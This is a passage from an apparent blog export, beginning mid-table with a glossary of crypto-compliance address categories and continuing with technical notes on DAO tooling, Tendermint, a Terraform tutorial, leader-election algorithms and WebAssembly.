<td><strong>News</strong></td>
<td>An online news publishing service.</td>
<td>ProPublica</td>
</tr>
<tr>
<td><strong>NFT Marketplace</strong></td>
<td>A marketplace enabling creators to sell NFTs to its users.</td>
<td>OpenSea</td>
</tr>
<tr>
<td><strong>OFAC Sanctioned Entity</strong></td>
<td>An entity sanctioned by the Office of Foreign Assets Control (OFAC) of the US Department of the Treasury.</td>
<td>Garantex Europe OU - OFAC SDN - 5 Apr 2022</td>
</tr>
<tr>
<td><strong>Outsourcing Provider</strong></td>
<td>A website promoting freelance opportunities.</td>
<td>coinworker</td>
</tr>
<tr>
<td><strong>Payment Services Provider</strong></td>
<td>A service offering the ability to accept online payments through a variety of payment methods, including cryptoassets.</td>
<td>BitPay</td>
</tr>
<tr>
<td><strong>Peer to Peer Exchange</strong></td>
<td>A platform on which individual buyers and sellers can exchange cryptocurrency for other payment types with one another.</td>
<td></td>
</tr>
<tr>
<td><strong>Phishing</strong></td>
<td>A form of fraud in which a message sender attempts to trick the recipient into divulging important personal information like a password or bank account number, transferring money or installing malicious software. Usually, the sender pretends to be a representative of a legitimate organisation.</td>
<td><a href="https://tron-block.com/">TRON Web Wallet Phishing (https://tron-block.com</a>)</td>
</tr>
<tr>
<td><strong>Political Campaign</strong></td>
<td>A political campaign or organisation.</td>
<td>Alexey Navalny Campaign</td>
</tr>
<tr>
<td><strong>Ponzi Scheme</strong></td>
<td>A form of fraud in which belief in the success of a nonexistent enterprise is fostered by the payment of quick returns to the first investors from money invested by later investors.</td>
<td>Jetcoin</td>
</tr>
<tr>
<td><strong>Privacy Wallet</strong></td>
<td>A crypto wallet that offers features helping users to avoid de-anonymization on the blockchain.  <br>​  <br>This could be by allowing them to participate in coinjoin transactions, or by providing a built-in mixer service, among others.</td>
<td>Wasabi wallet</td>
</tr>
<tr>
<td><strong>Ransomware</strong></td>
<td>A type of malicious software from cryptovirology that threatens to publish the victim’s data or perpetually block access to it unless a ransom is paid.</td>
<td>WannaCry 2.0</td>
</tr>
<tr>
<td><strong>Reported Loss</strong></td>
<td>Purported loss of cryptoasset often due to destruction or a fork. Unlike a theft, the funds associated with a loss are no longer accessible, as a loss often involves the destruction of private keys.</td>
<td>October 2011 Mt. Gox Loss</td>
</tr>
<tr>
<td><strong>Research Chemicals</strong></td>
<td>Bulk chemical retailers for laboratory use only.  <br>​  <br>However, in practice, research chemicals are often used to produce illicit drugs.</td>
<td>Buckled.eu</td>
</tr>
<tr>
<td><strong>Scam</strong></td>
<td>Any other type of fraudulent scheme.</td>
<td>Prodeum</td>
</tr>
<tr>
<td><strong>Shielded</strong></td>
<td>A shielded address uses cryptographic techniques to obscure on-chain information such as addresses and amounts</td>
<td></td>
</tr>
<tr>
<td><strong>Software Development</strong></td>
<td>A software development organisation.</td>
<td>GIMP</td>
</tr>
<tr>
<td><strong>Software Wallet</strong></td>
<td>An intangible software wallet to store cryptoassets, located on an online platform, individual’s computer, or external hard drive.</td>
<td>MyBitcoin</td>
</tr>
<tr>
<td><strong>Terrorist Organisation</strong></td>
<td>An organisation involved in terrorism or related activity.</td>
<td>ISIS</td>
</tr>
<tr>
<td><strong>Thief</strong></td>
<td>Recipient of stolen funds.</td>
<td>Stolen CoinSecure Funds</td>
</tr>
<tr>
<td><strong>Token</strong></td>
<td>Tokens are a representation of a particular asset or utility, that resides on top of another blockchain, such as Ethereum.  <br>​  <br>Tokens can represent a range of fungible assets, such as property, to assets that are intangible, like Cryptokitties, and cryptoassets, like EOS.</td>
<td>EOS</td>
</tr>
<tr>
<td><strong>Token Sale</strong></td>
<td>A Crowdsale, pre-sale, or otherwise sale associated with the launch of a Token or other cryptoasset.</td>
<td>Atlant Token Crowdsale</td>
</tr>
<tr>
<td><strong>Trading Platform</strong></td>
<td>An exchange software and services provider.  <br>​  <br>This entity does not operate exchanges but provides the software to operate them.</td>
<td>Alphapoint</td>
</tr>
<tr>
<td><strong>User</strong></td>
<td>A forum or social media user.</td>
<td>Niktitan132</td>
</tr>
<tr>
<td><strong>Unknown</strong></td>
<td>An “unknown” entity or category means the address is not labeled in the Elliptic system. This means we do not recognize the address as being controlled by any specific entity.</td>
<td></td>
</tr>
<tr>
<td><strong>Validator</strong></td>
<td>A Validator for a Ledger-based currency.</td>
<td></td>
</tr>
<tr>
<td><strong>Venture Capital</strong></td>
<td>A venture capital organisation working with startups, early-stage, and emerging companies that have been deemed to have high growth potential.</td>
<td>Alter VC</td>
</tr>
<tr>
<td><strong>VPN Vendor</strong></td>
<td>A vendor that provides Virtual Private Networks (VPN) services.</td>
<td>SecureVPN</td>
</tr>
</tbody></table>
<h2 id="Entity-Naming-Conventions-as-best-example"><a href="#Entity-Naming-Conventions-as-best-example" class="headerlink" title="Entity Naming Conventions as best example"></a>Entity Naming Conventions as best example</h2><table>
<thead>
<tr>
<th><strong>Entity Name</strong></th>
<th><strong>Description</strong></th>
<th><strong>Category</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Fraud Incident &amp; Customer Submitted Fraud Incident</strong></td>
<td>These are client-submitted incidents involving fraudulent activity, such as the use of fraudulent credit card data. It is placed within the Thief category but the identity of the actor is unknown eg. Fraud Incident - 1171161288</td>
<td>Thief</td>
</tr>
<tr>
<td><strong>Blacklisted Address</strong></td>
<td>A token issuer has blacklisted these addresses. Elliptic does not have any information regarding why the address is blacklisted. Contact the issuer for more details, eg. USDT Blacklisted Address - 57492936</td>
<td>Scam</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>CBDC</tag>
        <tag>BANK</tag>
        <tag>数字资产</tag>
        <tag>金融</tag>
        <tag>加密</tag>
      </tags>
  </entry>
  <entry>
    <title>Status-Update-DAO-Data&amp;project-management-and-governance-by-Web3</title>
    <url>/2024/10/31/Status-Update-DAO-Data&amp;project-management-and-governance-by-Web3/</url>
    <content><![CDATA[<p><a href="https://kosmos.org/">https://kosmos.org/</a> are developing a free, open-source, and user-centric alternative to centralized group chat platforms. They offer <a href="https://kosmos.org/projects/">https://kosmos.org/projects/</a>:</p>
<h3 id="1-Kosmos-Accounts-amp-Services"><a href="#1-Kosmos-Accounts-amp-Services" class="headerlink" title="1) Kosmos Accounts &amp; Services"></a>1) Kosmos Accounts &amp; Services</h3><p>Kosmos Accounts give people access to Kosmos hosted services.</p>
<h3 id="2-Kosmos-Chat"><a href="#2-Kosmos-Chat" class="headerlink" title="2) Kosmos Chat"></a>2) Kosmos Chat</h3><p>Kosmos Chat is a group chat application. All of its components can be either self-hosted or connected to hosted services. <strong>No user data is ever locked into hosted silos</strong>.</p>
<h3 id="3-Kredits-—-https-kredits-kosmos-org-dashboard"><a href="#3-Kredits-—-https-kredits-kosmos-org-dashboard" class="headerlink" title="3) Kredits — https://kredits.kosmos.org/dashboard"></a>3) Kredits — <a href="https://kredits.kosmos.org/dashboard">https://kredits.kosmos.org/dashboard</a></h3><p>Kredits are a system for tracking opensource project contributions, enabling and facilitating the fair and transparent use of project funds, as well as improving project management and governance.<br><a href="https://wiki.kosmos.org/Kredits">https://wiki.kosmos.org/Kredits</a></p>
<h4 id="High-level-overview"><a href="#High-level-overview" class="headerlink" title="High-level overview"></a>High-level overview</h4><p><img src="/2024/10/31/Status-Update-DAO-Data&project-management-and-governance-by-Web3/1.png"></p>
<h3 id="Similar-projects-ideas"><a href="#Similar-projects-ideas" class="headerlink" title="Similar projects/ideas"></a>Similar projects/ideas</h3><ol>
<li><a href="https://colony.io/">https://colony.io/</a> — Colony is a DAO which exists to make it easy for others to build DAOs.<br> <strong>How Colony Makes Money</strong><br><img src="/2024/10/31/Status-Update-DAO-Data&project-management-and-governance-by-Web3/2.png"></li>
</ol>
<ul>
<li>The Colony Network levies a small fee on Payments leaving a colony to an external address.</li>
<li>Fees paid in whitelisted tokens like USDC, USDT, WETH or xDAI go to the Metacolony to incentivise contributors.</li>
<li>Fees paid in other ERC20 tokens go to auctions where token buyers can purchase ERC20 tokens using CLNY, which is burned.</li>
</ul>
<ol start="2">
<li><p><a href="https://github.com/Commonfare-net/macao-social-wallet">https://github.com/Commonfare-net/macao-social-wallet</a> , <a href="https://freecoin.dyne.org/">https://freecoin.dyne.org/</a> — Freecoin is a set of tools to let people run <strong>reward schemes</strong> that are <strong>transparent and auditable</strong> to other organisations. It is made for <strong>participatory and democratic organisations</strong> who want to incentivise participation, unlike centralised banking databases.</p>
</li>
<li><p><a href="https://giveth.io/">https://giveth.io/</a> — Support global projects in the fields of public goods, sustainability and regeneration through cryptocurrency donations. <a href="https://github.com/Giveth">https://github.com/Giveth</a></p>
</li>
<li><p><a href="https://www.gitcoin.co/">https://www.gitcoin.co/</a> — Gitcoin Grants Program, we’ve distributed over $60M to early stage builders championing projects across DeFi, climate, open source and beyond.</p>
</li>
<li><p><a href="https://shapeshift.com/">https://shapeshift.com/</a> — ShapeShift champions the principles of permissionless access, trustless operations, privacy, and non-custodial asset management, providing users with a secure and autonomous digital currency management experience. ShapeShift supports 150+ different wallets including MetaMask, Ledger, xDeFi, WalletConnect, Coinbase, and Keplr.<br><img src="/2024/10/31/Status-Update-DAO-Data&project-management-and-governance-by-Web3/3.png"></p>
</li>
<li><p><a href="https://activitypods.org/">https://activitypods.org/</a> , <a href="https://github.com/activitypods/activitypods">https://github.com/activitypods/activitypods</a> — Solid (Social Linked Data) is a set of specifications whose aim is to allow users to store all their data in Pods (“Personal Online Datastores”). Users have full control over their Pods and can give permissions to applications or people they trust. <a href="https://solidproject.org/">https://solidproject.org/</a></p>
</li>
<li><p><a href="https://www.hyphanet.org/">https://www.hyphanet.org/</a> , <a href="https://github.com/hyphanet/fred">https://github.com/hyphanet/fred</a> — a peer-to-peer platform for  <strong>censorship-resistant</strong> and <strong>privacy-respecting</strong> publishing and communication.</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>BANK</tag>
        <tag>数字资产</tag>
        <tag>金融</tag>
        <tag>加密</tag>
      </tags>
  </entry>
  <entry>
    <title>Neural-Networks-and-Software-Reliablity</title>
    <url>/2023/07/24/Neural-Networks-and-Software-Reliablity/</url>
    <content><![CDATA[<h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/1.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/2.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/3.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/4.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/5.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/6.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/7.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/8.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/9.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/10.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/11.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/12.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/13.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/14.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/15.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/16.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/17.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/18.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/19.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/20.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/21.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/22.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/23.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/24.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/25.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/25.1.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/26.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/27.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/28.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/29.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/30.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/31.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/32.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/33.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/34.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/35.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/36.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/37.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/38.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/39.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/40.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/41.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/42.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/43.png"></p>
<p><img src="/2023/07/24/Neural-Networks-and-Software-Reliablity/44.png"></p>
]]></content>
      <tags>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Tendermint-I-ABCI介绍</title>
    <url>/2021/10/29/Tendermint-I-ABCI%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p><img src="/2021/10/29/Tendermint-I-ABCI%E4%BB%8B%E7%BB%8D/1.png" alt="tendermint ABCI接口时序图"></p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Tendermint-II-轻客户端</title>
    <url>/2021/11/08/Tendermint-II-%E8%BD%BB%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
    <content><![CDATA[<h3 id="区块链轻客户端需要解决的的问题"><a href="#区块链轻客户端需要解决的的问题" class="headerlink" title="区块链轻客户端需要解决的的问题"></a>区块链轻客户端需要解决的的问题</h3><p>如何如需信任任何固定的区块链节点，包括验证者集合和全节点，如何做到仅相信作为整体的活跃验证者集合。</p>
<p>基于PoS机制的区块链中，全节点和轻客户端都会面临弱主观性问题：由于无法仅依赖数学或者PoW等机制验证某个高度的状态，全节点和轻客户端都需要通过某种方式获取关于区块链在某个高度的可信状态。</p>
<p>Tendermint Core轻客户端和Gaia Lite轻客户端都解决了上述问题，基于可信的初始活跃验证者集合，通过跟踪活跃验证者集合的演变，持续具有验证区块链合法性的能力。新区块链通过活跃验证者参与共识投票完成；通过Merkle证明进一步验证交易的合法性和链上状态的合法性。</p>
<p><img src="/2021/11/08/Tendermint-II-%E8%BD%BB%E5%AE%A2%E6%88%B7%E7%AB%AF/1.png"></p>
<p>轻客户端本身保存着当前的活跃验证者集合。当收到新的区块后，1）首先对区块头做检查；2）区块头中的验证者集合与轻客户端本身存储的验证者集合做比较，若相同，则通过+2/3的投票，通过验证，若不同，更新轻客户端的活跃验证者集合，再次验证；3）当轻客户端的安全性不足时（如高度不连续、bft超过1/3等等），与全节点进行交互验证。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Terraform</title>
    <url>/2023/07/05/Terraform/</url>
    <content><![CDATA[<h3 id="Terraform-https-www-terraform-io"><a href="#Terraform-https-www-terraform-io" class="headerlink" title="Terraform - https://www.terraform.io/"></a>Terraform - <a href="https://www.terraform.io/">https://www.terraform.io/</a></h3><p>Terraform is a provisioning focus tool.</p>
<p><a href="https://www.redhat.com/zh/%E4%B8%BB%E9%A2%98/%E8%87%AA%E5%8A%A8%E5%8C%96/%E4%BB%80%E4%B9%88%E6%98%AF%E7%BD%AE%E5%A4%87">provisioning - 置备是创建和设置 IT 基础架构的过程</a>，包括为管理用户和系统对各种资源访问权限所需执行的步骤。置备是部署服务器、应用、网络组件、存储、边缘设备等的早期阶段。</p>
<p>置备与<a href="https://www.redhat.com/zh/topics/automation/what-is-configuration-management">配置管理</a> - configuration-management 不同，但它们都属于部署过程中的步骤。一旦置备了系统，下一步就是配置系统，并在一段时间内使其保持一致。</p>
<h3 id="如何组合使用"><a href="#如何组合使用" class="headerlink" title="如何组合使用"></a>如何组合使用</h3><ul>
<li><p>Provisioning + Config management = Terraform + <a href="https://www.ansible.com/">Ansible</a></p>
</li>
<li><p>Provisioning + Server Templating = Terraform + <a href="https://www.packer.io/">packer</a></p>
</li>
<li><p>Provisioning + Orchestration Tool = Terraform + <a href="https://kubernetes.io/zh-cn/">kubernetes</a>，通常在AWS中会使用<a href="https://www.w3schools.com/aws/aws_cloudessentials_awseks.php">EKS</a>服务。</p>
</li>
</ul>
<h3 id="Terraform-Architecture"><a href="#Terraform-Architecture" class="headerlink" title="Terraform Architecture"></a>Terraform Architecture</h3><p><img src="/2023/07/05/Terraform/1.png"></p>
<h3 id="如何编写Terraform的代码？"><a href="#如何编写Terraform的代码？" class="headerlink" title="如何编写Terraform的代码？"></a>如何编写Terraform的代码？</h3><p>根据上图架构中，我们需要参考如下，AWS Provider 的文档，通过其中的代码，provisioning地构建AWS的IT基础设施。</p>
<p><a href="https://registry.terraform.io/providers/hashicorp/aws/latest/docs">https://registry.terraform.io/providers/hashicorp/aws/latest/docs</a></p>
<h3 id="如何执行Terraform？"><a href="#如何执行Terraform？" class="headerlink" title="如何执行Terraform？"></a>如何执行Terraform？</h3><p>all terraform cli docs are here ==&gt; <a href="https://developer.hashicorp.com/terraform/tutorials/cli">https://developer.hashicorp.com/terraform/tutorials/cli</a></p>
<h4 id="1-terraform-init"><a href="#1-terraform-init" class="headerlink" title="1.terraform init"></a>1.terraform init</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  02-overview git:(main) pwd</span><br><span class="line">/Users/xxx/Documents/source_code/devops-directive-terraform-course/02-overview</span><br><span class="line">➜  02-overview git:(main) ls</span><br><span class="line">README.md main.tf</span><br><span class="line">➜  02-overview git:(main) terraform -help  </span><br><span class="line">Usage: terraform [global options] &lt;subcommand&gt; [args]</span><br><span class="line"></span><br><span class="line">The available commands for execution are listed below.</span><br><span class="line">The primary workflow commands are given first, followed by</span><br><span class="line">less common or more advanced commands.</span><br><span class="line"></span><br><span class="line">Main commands:</span><br><span class="line">  init          Prepare your working directory for other commands</span><br><span class="line">  validate      Check whether the configuration is valid</span><br><span class="line">  plan          Show changes required by the current configuration</span><br><span class="line">  apply         Create or update infrastructure</span><br><span class="line">  destroy       Destroy previously-created infrastructure</span><br><span class="line"></span><br><span class="line">All other commands:</span><br><span class="line">  console       Try Terraform expressions at an interactive command prompt</span><br><span class="line">  fmt           Reformat your configuration in the standard style</span><br><span class="line">  force-unlock  Release a stuck lock on the current workspace</span><br><span class="line">  get           Install or upgrade remote Terraform modules</span><br><span class="line">  graph         Generate a Graphviz graph of the steps in an operation</span><br><span class="line">  import        Associate existing infrastructure with a Terraform resource</span><br><span class="line">  login         Obtain and save credentials for a remote host</span><br><span class="line">  logout        Remove locally-stored credentials for a remote host</span><br><span class="line">  metadata      Metadata related commands</span><br><span class="line">  output        Show output values from your root module</span><br><span class="line">  providers     Show the providers required for this configuration</span><br><span class="line">  refresh       Update the state to match remote systems</span><br><span class="line">  show          Show the current state or a saved plan</span><br><span class="line">  state         Advanced state management</span><br><span class="line">  taint         Mark a resource instance as not fully functional</span><br><span class="line">  test          Experimental support for module integration testing</span><br><span class="line">  untaint       Remove the &#x27;tainted&#x27; state from a resource instance</span><br><span class="line">  version       Show the current Terraform version</span><br><span class="line">  workspace     Workspace management</span><br><span class="line"></span><br><span class="line">Global options (use these before the subcommand, if any):</span><br><span class="line">  -chdir=DIR    Switch to a different working directory before executing the</span><br><span class="line">                given subcommand.</span><br><span class="line">  -help         Show this help output, or the help for a specified subcommand.</span><br><span class="line">  -version      An alias for the &quot;version&quot; subcommand.</span><br><span class="line">➜  02-overview git:(main) terraform init </span><br><span class="line"></span><br><span class="line">Initializing the backend...</span><br><span class="line"></span><br><span class="line">Initializing provider plugins...</span><br><span class="line">- Finding hashicorp/aws versions matching &quot;~&gt; 3.0&quot;...</span><br><span class="line">- Installing hashicorp/aws v3.76.1...</span><br><span class="line">- Installed hashicorp/aws v3.76.1 (signed by HashiCorp)</span><br><span class="line"></span><br><span class="line">Terraform has created a lock file .terraform.lock.hcl to record the provider</span><br><span class="line">selections it made above. Include this file in your version control repository</span><br><span class="line">so that Terraform can guarantee to make the same selections by default when</span><br><span class="line">you run &quot;terraform init&quot; in the future.</span><br><span class="line"></span><br><span class="line">Terraform has been successfully initialized!</span><br><span class="line"></span><br><span class="line">You may now begin working with Terraform. Try running &quot;terraform plan&quot; to see</span><br><span class="line">any changes that are required for your infrastructure. All Terraform commands</span><br><span class="line">should now work.</span><br><span class="line"></span><br><span class="line">If you ever set or change modules or backend configuration for Terraform,</span><br><span class="line">rerun this command to reinitialize your working directory. If you forget, other</span><br><span class="line">commands will detect it and remind you to do so if necessary.</span><br><span class="line"></span><br><span class="line">➜  02-overview git:(main) tree</span><br><span class="line">.</span><br><span class="line">|____main.tf</span><br><span class="line">|____.terraform</span><br><span class="line">| |____providers</span><br><span class="line">| | |____registry.terraform.io</span><br><span class="line">| | | |____hashicorp</span><br><span class="line">| | | | |____aws</span><br><span class="line">| | | | | |____3.76.1</span><br><span class="line">| | | | | | |____darwin_arm64</span><br><span class="line">| | | | | | | |____terraform-provider-aws_v3.76.1_x5</span><br><span class="line">|____README.md</span><br><span class="line">|____.terraform.lock.hcl</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-terraform-plan"><a href="#2-terraform-plan" class="headerlink" title="2.terraform plan"></a>2.terraform plan</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> terraform plan</span></span><br><span class="line">An execution plan has been generated and is shown below.</span><br><span class="line">Resource actions are indicated with the following symbols:</span><br><span class="line">  + create</span><br><span class="line"></span><br><span class="line">Terraform will perform the following actions:</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> aws_instance.example will be created</span></span><br><span class="line">  + resource &quot;aws_instance&quot; &quot;example&quot; &#123;</span><br><span class="line">      + ami                          = &quot;ami-0829e595217a759b9&quot;</span><br><span class="line">      + arn                          = (known after apply)</span><br><span class="line">           + tags                         = &#123;</span><br><span class="line">          + &quot;Name&quot;  = &quot;int32bit-test-ft&quot;</span><br><span class="line">          + &quot;Owner&quot; = &quot;int32bit&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      + vpc_security_group_ids       = (known after apply)</span><br><span class="line">      + ...</span><br><span class="line"></span><br><span class="line">Plan: 1 to add, 0 to change, 0 to destroy.</span><br></pre></td></tr></table></figure>

<h4 id="3-terraform-apply"><a href="#3-terraform-apply" class="headerlink" title="3.terraform apply"></a>3.terraform apply</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> terraform apply</span></span><br><span class="line">Plan: 1 to add, 0 to change, 0 to destroy.</span><br><span class="line"></span><br><span class="line">Do you want to perform these actions?</span><br><span class="line">  Terraform will perform the actions described above.</span><br><span class="line">  Only &#x27;yes&#x27; will be accepted to approve.</span><br><span class="line"></span><br><span class="line">  Enter a value: yes</span><br><span class="line"></span><br><span class="line">aws_instance.example: Creating...</span><br><span class="line">aws_instance.example: Still creating... [10s elapsed]</span><br><span class="line">aws_instance.example: Still creating... [20s elapsed]</span><br><span class="line">aws_instance.example: Creation complete after 20s [id=i-0bb96d24b6e6d37eb]</span><br><span class="line"></span><br><span class="line">Apply complete! Resources: 1 added, 0 changed, 0 destroyed.</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/Terraform/2.png"></p>
<h4 id="4-terraform-destroy"><a href="#4-terraform-destroy" class="headerlink" title="4.terraform destroy"></a>4.terraform destroy</h4><h4 id="5-adfs"><a href="#5-adfs" class="headerlink" title="5.adfs"></a>5.adfs</h4><p>在实际企业环境中，aws 的使用通常是需要多重身份验证的，所以多数使用 ADFS (multi factor authentication with active directory)。</p>
<p>其中最常用的工具是 <a href="https://github.com/venth/aws-adfs%EF%BC%8C%E9%80%9A%E8%BF%87">https://github.com/venth/aws-adfs，通过</a> 证书 / 身份（如SSO）/ 密码 登陆aws，terraform也是如此。</p>
<h3 id="实际项目结构"><a href="#实际项目结构" class="headerlink" title="实际项目结构"></a>实际项目结构</h3><p><img src="/2023/07/05/Terraform/3.png"></p>
<p><strong>而且，在复杂的系统部署中，可以针对每一个module的tf中，添加 shell 脚本，如针对compute.tf单独运行的shell脚本，让每一个脚本（手动）执行，即每一terraform部署完成后，确认执行结果。</strong>分步骤地，解耦地完成复杂系统的部署工作，切能够按照企业要求，完成安全，网络，EKS等规则要求。</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>all terraform providers ==&gt; <a href="https://registry.terraform.io/browse/providers">https://registry.terraform.io/browse/providers</a></p>
<p>terraform Course ==&gt; <a href="https://www.youtube.com/watch?v=7xngnjfIlK4&amp;t=8s">https://www.youtube.com/watch?v=7xngnjfIlK4&amp;t=8s</a> </p>
]]></content>
      <tags>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title>Token Ring Election Algorithm</title>
    <url>/2018/03/27/Token-Ring-Election-Algorithm/</url>
    <content><![CDATA[<p>令牌环领导人选举算法</p>
<p>We start with 6 processes,<br>    connected in a logical ring.<br>Process 6 is the leader,<br>    as it has the highest number.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/0.gif"><br>Process 6 fails.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/1.gif"><br>Process 3 notices that Process 6 does not respond<br>    So it starts an election,<br>        sending a message containing its id<br>    to the next node in the ring.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/2.gif"><br>Process 5 passes the message on,<br>    adding its own id to the message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/3.gif"><br>Process 0 passes the message on,<br>    adding its own id to the message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/4.gif"><br>Process 1 passes the message on,<br>    adding its own id to the message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/5.gif"><br>Process 4 passes the message on,<br>    adding its own id to the message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/6.gif"><br>When Process 3 receives the message back,<br>    it knows the message has gone around the ring,<br>        as its own id is in the list.<br>Picking the highest id in the list,<br>    it starts the coordinator message<br>        “5 is the leader” around the ring.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/7.gif"><br>Process 5 passes on the coordinator message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/8.gif"><br>Process 0 passes on the coordinator message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/9.gif"><br>Process 1 passes on the coordinator message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/10.gif"><br>Process 4 passes on the coordinator message.<br><img src="/2018/03/27/Token-Ring-Election-Algorithm/11.gif"><br>Process 3 receives the coordinator message,<br>    and stops it.</p>
<p>让我们分析如何在ZooKeeper集合中选举leader节点，这个过程和令牌环原理是一致的。考虑一个集群中有N个节点。leader选举的过程如下：</p>
<ul>
<li>所有节点创建具有相同路径 /app/leader_election/guid_ 的顺序、临时节点。</li>
<li>ZooKeeper集合将附加10位序列号到路径，创建的znode将是 /app/leader_election/guid_0000000001，/app/leader_election/guid_0000000002等。</li>
<li>对于给定的实例，在znode中创建最小数字的节点成为leader，而所有其他节点是follower。</li>
<li>每个follower节点监视下一个具有最小数字的znode。例如，创建znode/app/leader_election/guid_0000000008的节点将监视znode/app/leader_election/guid_0000000007，创建znode/app/leader_election/guid_0000000007的节点将监视znode/app/leader_election/guid_0000000006。</li>
<li>如果leader关闭，则其相应的znode/app/leader_electionN会被删除。</li>
<li>下一个在线follower节点将通过监视器获得关于leader移除的通知。</li>
<li>下一个在线follower节点将检查是否存在其他具有最小数字的znode。如果没有，那么它将承担leader的角色。否则，它找到的创建具有最小数字的znode的节点将作为leader。</li>
<li>类似地，所有其他follower节点选举创建具有最小数字的znode的节点作为leader。</li>
</ul>
]]></content>
      <tags>
        <tag>共识协议</tag>
      </tags>
  </entry>
  <entry>
    <title>WebAssembly 介绍</title>
    <url>/2018/07/26/WebAssembly-%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h4 id="解决什么问题？"><a href="#解决什么问题？" class="headerlink" title="解决什么问题？"></a>解决什么问题？</h4><p>JavaScript 从诞生起到现在已经变成最流行的编程语言，这背后正是 Web 的发展所推动的。Web 应用变得更多更复杂，但这也渐渐暴露出了 JavaScript 的问题：</p>
<ol>
<li>语法太灵活导致开发大型 Web 项目困难；</li>
<li>性能不能满足一些场景的需要。</li>
<li>针对以上两点缺陷，近年来出现了一些 JS 的代替语言，例如：</li>
</ol>
<ul>
<li>微软的 TypeScript 通过为 JS 加入静态类型检查来改进 JS 松散的语法，提升代码健壮性；</li>
<li>谷歌的 Dart 则是为浏览器引入新的虚拟机去直接运行 Dart 程序以提升性能；</li>
